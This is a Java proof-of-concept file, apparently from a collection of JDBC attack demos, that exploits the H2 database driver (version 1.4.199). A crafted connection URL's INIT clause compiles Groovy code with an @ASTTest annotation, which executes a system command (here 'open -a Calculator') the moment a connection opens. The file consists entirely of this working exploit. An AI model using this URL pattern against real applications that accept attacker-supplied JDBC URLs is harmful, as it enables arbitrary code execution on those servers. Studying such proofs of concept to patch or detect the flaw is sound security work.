package org.su18.jdbc.attack.h2;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * 依赖版本 1.4.199
 * 驱动名称 org.h2.Driver
 * 攻击方式 Groovy Source Code Compile
 * 需要 groovy-sql 依赖
 *
 * @author su18
 */
public class AttackH2ByGroovy {

	public static void main(String[] args) throws Exception {
		// 装载驱动
		Class.forName("org.h2.Driver");

//		String groovy = "@groovy.transform.ASTTest(value={" + " assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")" + "})" + "def x";
//		String url    = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '" + groovy + "'";
//		System.out.println(url);
		String url = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE ALIAS T5 AS '@groovy.transform.ASTTest(value={ assert java.lang.Runtime.getRuntime().exec(\"open -a Calculator\")})def x'";
		Connection conn = DriverManager.getConnection(url);
		conn.close();
	}
}
